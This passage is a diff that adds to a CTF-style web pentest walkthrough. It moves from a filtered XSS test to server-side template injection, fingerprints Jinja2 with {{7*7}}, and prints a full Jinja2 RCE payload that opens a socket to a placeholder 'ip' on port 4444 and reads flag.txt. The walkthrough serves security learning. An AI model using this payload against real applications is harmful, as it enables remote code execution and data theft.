@@ -246,10 +246,105 @@ for the title and for the content  and see what we get:
 
 ![[xss-payload.png]]
 
-Alright we don't get anything reflected back, lets just quickly check the source code to see what's up!
+Alright we don't get anything reflected back, ***lets just quickly check the source code*** to see what's up!
 
 ![[source-code-xss.png]]
 
 Looks like our payload is being filtered out, so this saves us some time in future XSS payloads, perhaps we will need to bypass their filer, but for now lets just keep this in our notes and move on to template injection!
 
-I personally like template injection because if successful it could lead to vertical movement so if you are unfamiliar 
+### **Moving On: Template Injection**
+
+Looks like our XSS payload is getting filtered. Good to know—it saves us time messing with basic payloads. We’ll keep this in our notes in case we need to bypass it later, but for now, let’s see what’s up with template injection.
+
+Template injection happens when user input is processed by a template engine in an unsafe way. Instead of guessing which engine is in use, we’ll start with a **polyglot payload**, a string designed to trigger errors across multiple engines:
+
+```plaintext
+${{<%[%'"}}%\.
+```
+
+If the app processes this as a template, we might get a **500 Internal Server Error**, which is exactly what we want. That would tell us the input is being evaluated, meaning we could be looking at a way to execute commands or leak sensitive data. If nothing happens, input is likely sanitized. 
+
+Let’s drop this into both the title and message fields and see what we get.
+
+Step 1:
+![[post-polygot.png]]
+
+Step 2:
+![[polyglot-reflected.png]]
+
+Alright, so what do we see, looks like the application is reflecting this sanitized and we didn't get a 500 internal server error. Similar to the XSS payload lets take a look at the source code to see if we can just get an idea on how things are being filtered.
+
+Source code review:
+![[source-code-archive.png]]
+
+Investigating the source code to get an idea on how things are being filtered, what we end up finding it an interesting comment that was left in by the developer. We see that there is another endpoint called /archive. Guessing by our current enumeration of the web application, the fact that this is the source code of the messages, we can assume that archive are just an archive of all the users posts. So lets check out the archive endpoint.
+
+![[archive-error.png]]
+
+Oh yea, I mean this is the good stuff. This is about to get a whole lot interesting now. So we just confirmed Template injection, however we still have to investigate which template is throwing the error? What part of the polyglot is being digested? 
+
+There are two ways to confirm something like this. There is a browser extension that was mention by my TCM security teacher called Wappalyzer. This extension tells you what technology is the web application is possibly using. If you already have this extension installed then you probably already noticed that it did say that there is something Python related. If you do not we can take a look at our arsenal and see what we can use to get more information from the web application. We lean back on burp suite.
+
+Lets start off by using another very popular payload to see what we get .
+
+Lets go with 
+```
+{{7*7}}
+```
+
+And also lets just refer to this flow chart:
+
+![[ssti-flowchart.png]]
+
+I decided to go with 
+```plaintext
+{{7*7}}
+```
+
+Because we already confirmed template injection so according to the flow chart we have to choose a path, and PayloadsAllTheThings tells us that the following are very common payloads.
+
+```
+- `{{7*7}}` for Jinja2 (Python).
+- `#{7*7}` for Thymeleaf (Java).
+```
+
+So lets just give it a try, here is the plan we are going to go ahead and delete the current post we did because we are always going to get a 500 internal server error if we load into the /archvie endpoint, our main goal right now is to see if we identify the technology that the template is being ran on and also to see if we can get an evaluation on the payload, so it should evaluate to 49.
+
+Lets do this in steps:
+
+1. Lets delete the current message, this is because we will use /archive as just a page to evaluate our payloads. Right now we have it evaluating to an 500 internal server error
+2. Once deleted lets go back to create a new message post
+3. This time we are going to input the payload `{{7*7}}` in both the title and as the content of the message.
+4. We post it, and confirm if it reflects on the page.
+5. We then return back to /archive endpoint.
+
+Lets investigate /archive and /home with burp suite. Lets head on over to the the HTTP history and locate the two endpoints we want to concentrate on.
+
+Burpsuite home endpoint:
+![[burp-server-identity.png]]
+
+
+Burpsuite archive endpoint:
+![[archive-49.png]]
+Okay so what have you figured out here, are two things the first at the /home response we can see that the server is running python, and second that the evaluation did in fact evaluate to 49, so referring back to our flowchart, we can determine that we will end up at Jinja2 or Twig.
+
+This is pretty exciting. So the idea is we confirm SSTI, then we try a payload to narrow down the template running, then keep narrowing the payload till we hit a confirmation. So lets move on to the `{{7*'7'}} payload` So this payload looks funny but its just taking the number 7 multiplying the string 7, or in this case the character. So the output should be 7777777. 
+
+
+Okay so now we just upload a new message and do the same thing again, this time we dont have to delete our old message because it isn't causing a 500 internal server error. We go through the process again, we go post a new message, we make sure that it's just on the title, we confirmed this on the burp suite screenshot. So we don't have to post it on the message body. 
+
+We do the same again, we head over to /archive, we head to the source page and verify if our payload is evaluated.
+
+We see 49 from our previous payload, then we see the seven 7 and we now can confirm this can be either Jinja2 or twig but because we now the server is using Python, we have confirmed this to be Jinja2 since Twig is PHP. We can start testing for RCE now.
+
+![[archive-jinja-payload.png]]
+
+Alright now this part of the walkthrough we have to understand some things which is what is popen, offset, and understanding the payload all together 
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+It is a lot to read, as web app pen testers payloads are tools for us to use, and as any tool it is important for us to know what our tool does, so lets just understand this payload as a high level overview, and remember, you can always save this in your github repo or notes, or just go back to payloadsallthethings github and do more research on it later or take notes as you do your research and keep it in your arsenal for future use.
+
+
